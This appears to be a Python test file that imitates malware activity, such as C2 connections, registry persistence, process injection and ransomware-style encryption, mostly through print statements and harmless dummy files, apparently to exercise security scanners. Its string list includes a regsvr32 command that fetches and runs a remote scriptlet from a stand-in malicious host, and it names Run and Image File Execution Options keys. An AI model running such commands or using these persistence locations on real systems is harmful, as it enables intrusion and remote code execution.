#!/usr/bin/env python3
import os
import sys
import socket
import subprocess
import base64
import random
import time
import threading
import requests
import winreg
import ctypes
import struct

class SuspiciousTestFile:
    """
    This is a safe test file that simulates suspicious behavior.
    It does not perform any actual malicious actions.
    """
    
    def __init__(self):
        self.temp_dir = os.path.join(os.path.dirname(__file__), 'temp')
        os.makedirs(self.temp_dir, exist_ok=True)
        
        # Suspicious-looking strings (for detection)
        self.suspicious_strings = [
            "cmd.exe /c powershell.exe -enc",
            "rundll32.exe shell32.dll,ShellExecute",
            "regsvr32.exe /s /n /i:http://malicious.example.com/payload.sct scrobj.dll",
            "CreateRemoteThread",
            "WriteProcessMemory",
            "LoadLibraryA",
            "WinExec",
            "CreateProcess",
            "VirtualAlloc",
            "HTTP/1.1 200 OK",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "botnet",
            "keylogger",
            "rootkit",
            "backdoor",
            "ransomware",
            "exploit",
            "payload",
            "shellcode",
            "meterpreter",
            "reverse shell",
            "privilege escalation",
            "persistence",
            "lateral movement",
            "data exfiltration"
        ]
        
        # Base64 encoded strings (looks suspicious)
        self.encoded_data = base64.b64encode(b"This is suspicious looking base64 data that contains shellcode and malicious payload").decode()
        
        # Suspicious binary patterns
        self.suspicious_patterns = [
            b"\x90\x90\x90\x90",  # NOP sled
            b"\xEB\xFF",          # JMP instruction
            b"\xE8\x00\x00\x00\x00",  # CALL instruction
            b"\x68\x00\x00\x00\x00",  # PUSH instruction
            b"\xC3"               # RET instruction
        ]
        
    def simulate_file_operations(self):
        """Simulate suspicious file operations."""
        suspicious_filenames = [
            'keylogger.dat',
            'botnet_config.json',
            'stolen_data.enc',
            'backdoor.cfg',
            'system32.dll.exe',
            'svchost.exe',
            'lsass.exe',
            'explorer.exe',
            'cmd.exe',
            'powershell.exe',
            'payload.bin',
            'shellcode.dat',
            'meterpreter.bin',
            'ransomware.exe',
            'exploit.dll'
        ]
        
        for filename in suspicious_filenames:
            filepath = os.path.join(self.temp_dir, filename)
            with open(filepath, 'wb') as f:
                # Write suspicious patterns
                f.write(random.choice(self.suspicious_patterns))
                f.write(self.encoded_data.encode())
                f.write(b"\x00" * 100)  # Null bytes
            time.sleep(0.1)
            os.remove(filepath)
            
    def simulate_network_activity(self):
        """Simulate suspicious network connections (without actually connecting)."""
        suspicious_domains = [
            'malware.example.com',
            'botnet-c2.example.net',
            'stolen-data.example.org',
            'backdoor.example.com',
            'exploit-kit.example.net',
            'ransomware-c2.example.com',
            'data-exfil.example.org',
            'command-control.example.net',
            'malicious-payload.example.com',
            'exploit-server.example.net'
        ]
        
        suspicious_ports = [4444, 666, 31337, 1337, 8080, 8888, 9999]
        
        for domain in suspicious_domains:
            for port in suspicious_ports:
                print(f"[SIMULATION] Attempting connection to: {domain}:{port}")
                print(f"[SIMULATION] Sending encrypted payload to {domain}")
                print(f"[SIMULATION] Receiving commands from C2 server")
                time.sleep(0.1)
            
    def simulate_system_changes(self):
        """Simulate suspicious system modifications."""
        registry_keys = [
            'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services',
            'HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell',
            'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute',
            'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
        ]
        
        for key in registry_keys:
            print(f"[SIMULATION] Modifying registry key: {key}")
            print(f"[SIMULATION] Adding persistence mechanism")
            print(f"[SIMULATION] Modifying system startup")
            time.sleep(0.1)
            
    def simulate_process_injection(self):
        """Simulate process injection behavior."""
        target_processes = [
            'explorer.exe',
            'svchost.exe',
            'lsass.exe',
            'winlogon.exe',
            'csrss.exe',
            'services.exe',
            'wininit.exe',
            'spoolsv.exe'
        ]
        
        for process in target_processes:
            print(f"[SIMULATION] Attempting to inject code into {process}")
            print(f"[SIMULATION] VirtualAllocEx in {process}")
            print(f"[SIMULATION] WriteProcessMemory in {process}")
            print(f"[SIMULATION] CreateRemoteThread in {process}")
            print(f"[SIMULATION] Modifying process memory")
            print(f"[SIMULATION] Hooking API calls")
            time.sleep(0.1)
            
    def simulate_encryption(self):
        """Simulate file encryption behavior."""
        test_files = [
            'document.doc',
            'spreadsheet.xls',
            'presentation.ppt',
            'database.db',
            'config.ini',
            'settings.json',
            'user_data.dat',
            'system_files.sys'
        ]
        
        for file in test_files:
            filepath = os.path.join(self.temp_dir, file)
            with open(filepath, 'wb') as f:
                f.write(b"Original content")
                f.write(random.choice(self.suspicious_patterns))
            
            # Simulate encryption
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted = base64.b64encode(data)
            
            with open(filepath + '.encrypted', 'wb') as f:
                f.write(encrypted)
                f.write(b"\x00" * 100)  # Add padding
            
            os.remove(filepath)
            time.sleep(0.1)
            os.remove(filepath + '.encrypted')
            
    def simulate_privilege_escalation(self):
        """Simulate privilege escalation attempts."""
        print("[SIMULATION] Attempting to elevate privileges")
        print("[SIMULATION] Modifying security tokens")
        print("[SIMULATION] Bypassing UAC")
        print("[SIMULATION] Exploiting system vulnerabilities")
        time.sleep(0.1)
        
    def simulate_persistence(self):
        """Simulate persistence mechanisms."""
        print("[SIMULATION] Adding startup entries")
        print("[SIMULATION] Creating scheduled tasks")
        print("[SIMULATION] Modifying system services")
        print("[SIMULATION] Installing hooks")
        time.sleep(0.1)
        
    def run_suspicious_behavior(self):
        """Execute all suspicious behavior simulations."""
        print("Starting suspicious behavior simulation...")
        print("NOTE: This is a safe test file. No actual malicious actions will be performed.")
        
        self.simulate_file_operations()
        self.simulate_network_activity()
        self.simulate_system_changes()
        self.simulate_process_injection()
        self.simulate_encryption()
        self.simulate_privilege_escalation()
        self.simulate_persistence()
        
        print("Simulation complete.")

def main():
    print("="*60)
    print("TEST FILE - Safe Suspicious Behavior Simulation")
    print("This file simulates suspicious behavior for testing purposes.")
    print("No actual malicious actions will be performed.")
    print("="*60)
    
    test = SuspiciousTestFile()
    test.run_suspicious_behavior()

if __name__ == "__main__":
    main()